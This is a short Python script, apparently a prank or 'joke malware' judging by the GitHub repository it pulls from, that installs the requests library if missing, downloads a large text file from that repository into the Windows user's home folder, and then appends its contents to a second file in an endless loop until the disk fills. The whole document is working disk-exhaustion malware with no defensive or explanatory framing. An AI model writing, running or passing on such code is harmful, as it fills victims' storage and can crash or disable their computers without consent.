try:
    import requests
except ModuleNotFoundError:
    import subprocess
    subprocess.Popen("python -m pip install requests", shell=True)
    import requests

import getpass
user = getpass.getuser()

bob = requests.get("https://github.com/BOBZERO-afk/joke_malware/raw/refs/heads/main/big_file.txt")
bob.raise_for_status()

with open(f"C:\\Users\\{user}\\t.txt", "w") as f:
    f.write(bob.text)

with open(f"C:\\Users\\{user}\\t.txt", "r") as f:
    bobent = f.readlines()

with open(f"C:\\Users\\{user}\\tt.txt", "w") as f:
    f.write("w")

while True:
    for line in bobent:
        with open(f"C:\\Users\\{user}\\tt.txt", "a") as f:
            f.write(line)
